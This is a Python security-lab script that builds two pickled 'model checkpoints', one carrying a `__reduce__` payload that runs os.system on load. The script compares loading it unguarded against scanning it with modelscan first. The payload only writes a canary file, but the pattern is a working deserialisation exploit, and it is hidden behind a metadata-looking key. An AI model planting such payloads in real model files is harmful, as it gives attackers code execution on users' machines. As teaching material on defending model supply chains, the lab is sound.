"""LIVE06: code execution when loading a model artefact.

This is the first lab where attacker code genuinely runs. Everything before it either
changed what a model said or moved data between processes. Here, loading a file executes
a command.

A model artefact is a pickle. Deserialising a pickle is not reading data — it is running
a small program, because `__reduce__` lets an object name any callable to invoke on load.
So "load this model" and "run this code" are the same operation, and no amount of
inspecting the *weights* tells you which one you are doing.

Difference from the upstream sample, stated rather than hidden: OffensiveLabs/Model-Backdoor
demonstrates this through `torch.save`/`torch.load`. This artefact is a plain pickle of the
same shape, because `torch` costs 5.6 GB and changes nothing about the lesson: the payload
mechanism, the execution, and the modelscan detection are identical. Only the loading API
differs.

The upstream payload runs `cat /etc/passwd`. That is replaced here with a command that
writes a canary into the sandbox tmpfs, which proves arbitrary execution just as well
without reading anything host-shaped, and leaves evidence that can be asserted.

Runs in a Tier C sandbox: no network, read-only rootfs, no mounts, uid 65534, removed on
exit. The backdoored artefact is generated inside the sandbox and never touches the host.
"""

from __future__ import annotations

import json
import os
import pickle
import subprocess
import sys
from pathlib import Path


# Proof-of-execution canary. Writing this file is only possible if the payload ran.
RCE_MARKER = "BANKO-FAKE-RCE-PROOF-7731"
PROOF_PATH = "/tmp/rce_proof.txt"
PAYLOAD_COMMAND = f"echo {RCE_MARKER} > {PROOF_PATH}"


class SystemPayload:
    """The whole attack. `__reduce__` tells pickle what to call when this is loaded."""

    def __reduce__(self):
        return (os.system, (PAYLOAD_COMMAND,))


def build_clean_artefact(path: Path) -> dict:
    """A benign artefact shaped like a model checkpoint."""
    state = {
        "format_version": 1,
        "architecture": "banko-credit-risk-mlp",
        "weights": {"layer1": [0.11, -0.42, 0.33], "layer2": [0.07, 0.91]},
        "labels": ["approve", "deny"],
    }
    with path.open("wb") as handle:
        pickle.dump(state, handle, protocol=4)
    return state


def build_backdoored_artefact(path: Path) -> None:
    """The same artefact with a payload object alongside the weights."""
    state = {
        "format_version": 1,
        "architecture": "banko-credit-risk-mlp",
        "weights": {"layer1": [0.11, -0.42, 0.33], "layer2": [0.07, 0.91]},
        "labels": ["approve", "deny"],
        # Indistinguishable from metadata until it is loaded.
        "_hydration_hook": SystemPayload(),
    }
    with path.open("wb") as handle:
        pickle.dump(state, handle, protocol=4)


def scan_artefact(path: Path) -> dict:
    """Run modelscan and summarise what it found."""
    try:
        from modelscan.modelscan import ModelScan

        scanner = ModelScan()
        scanner.scan(path)
        issues = scanner.issues.all_issues
        findings = []
        for issue in issues:
            details = getattr(issue, "details", None)
            findings.append(
                {
                    "severity": getattr(getattr(issue, "severity", None), "name", str(getattr(issue, "severity", ""))),
                    "operator": getattr(details, "operator", None),
                    "module": getattr(details, "module", None),
                    "scanner": getattr(details, "scanner", None),
                }
            )
        return {"ran": True, "issue_count": len(issues), "findings": findings[:10]}
    except Exception as exc:  # noqa: BLE001 - surfaced as lab evidence
        return {"ran": False, "error": f"{type(exc).__name__}: {str(exc)[:200]}"}


def main() -> int:
    request = json.loads(sys.argv[1]) if len(sys.argv) > 1 else {}
    mode = request.get("mode", "vulnerable")
    secure = mode == "secure"

    home = Path(os.environ.get("HOME", "/tmp"))
    clean_path = home / "banko_model_clean.pkl"
    unsafe_path = home / "banko_model_backdoored.pkl"

    # Remove any stale canary so its presence afterwards can only mean execution.
    proof = Path(PROOF_PATH)
    if proof.exists():
        proof.unlink()

    clean_state = build_clean_artefact(clean_path)
    build_backdoored_artefact(unsafe_path)

    result: dict = {
        "lab_id": "LIVE06",
        "mode": mode,
        "rce_marker": RCE_MARKER,
        "payload_command": PAYLOAD_COMMAND,
        "clean_artefact_bytes": clean_path.stat().st_size,
        "backdoored_artefact_bytes": unsafe_path.stat().st_size,
        "artefacts_look_alike": abs(clean_path.stat().st_size - unsafe_path.stat().st_size) < 200,
        "defences_applied": (
            ["modelscan_before_load", "unsafe_operators_refused", "load_never_attempted_on_flagged_artefact"]
            if secure else []
        ),
    }

    # Both modes scan, so the detection can be compared. Only secure mode acts on it.
    clean_scan = scan_artefact(clean_path)
    unsafe_scan = scan_artefact(unsafe_path)
    result["scan_clean"] = clean_scan
    result["scan_backdoored"] = unsafe_scan
    result["scan_detected_backdoor"] = bool(unsafe_scan.get("issue_count"))
    result["scan_clean_is_quiet"] = clean_scan.get("issue_count") == 0

    loaded = None
    if secure and result["scan_detected_backdoor"]:
        result["outcome"] = "refused_before_load"
        result["load_attempted"] = False
    else:
        result["load_attempted"] = True
        try:
            with unsafe_path.open("rb") as handle:
                loaded = pickle.load(handle)
            result["outcome"] = "artefact_loaded"
        except Exception as exc:  # noqa: BLE001
            result["outcome"] = "load_failed"
            result["error"] = f"{type(exc).__name__}: {str(exc)[:200]}"

    # Did the payload actually run? The canary can only exist if it did.
    executed = proof.exists() and RCE_MARKER in proof.read_text(encoding="utf-8", errors="ignore")
    result.update(
        {
            "llm_called": False,
            "input_tokens": 0,
            "output_tokens": 0,
            "code_execution_occurred": executed,
            "proof_file_contents": proof.read_text(encoding="utf-8", errors="ignore").strip() if executed else "",
            "weights_loaded_ok": bool(loaded) and loaded.get("architecture") == clean_state["architecture"],
            # Containment claims, checked from inside the sandbox rather than asserted.
            "containment": {
                "network_available": _network_reachable(),
                "host_repo_visible": os.path.exists("/root/Documents/ML-AI-Banking-App"),
                "docker_socket_visible": os.path.exists("/var/run/docker.sock"),
                "uid": os.getuid(),
                "rootfs_writable": _rootfs_writable(),
            },
            "model_call": {
                "role": "none", "backend": "none", "model": "no_model_required",
                "model_digest": "", "simulated": False, "metered": False,
                "thinking": "", "truncated": False,
            },
            "trust_boundary": (
                "enforced_artefact_scanned_before_deserialisation" if secure
                else "failed_deserialisation_executed_attacker_code"
            ),
            "lesson": (
                "modelscan flagged the unsafe operator and the artefact was never "
                "deserialised, so the payload had no opportunity to run."
                if secure else
                "Loading the file ran the command. The two artefacts are within 200 bytes "
                "of each other and both contain valid weights; nothing about inspecting "
                "the model distinguishes them."
            ),
        }
    )
    print(json.dumps(result))
    return 0


def _network_reachable() -> bool:
    import socket

    sock = socket.socket()
    sock.settimeout(2)
    try:
        sock.connect(("1.1.1.1", 53))
        return True
    except Exception:
        return False
    finally:
        sock.close()


def _rootfs_writable() -> bool:
    try:
        with open("/probe_write", "w") as handle:
            handle.write("x")
        os.unlink("/probe_write")
        return True
    except Exception:
        return False


if __name__ == "__main__":
    raise SystemExit(main())
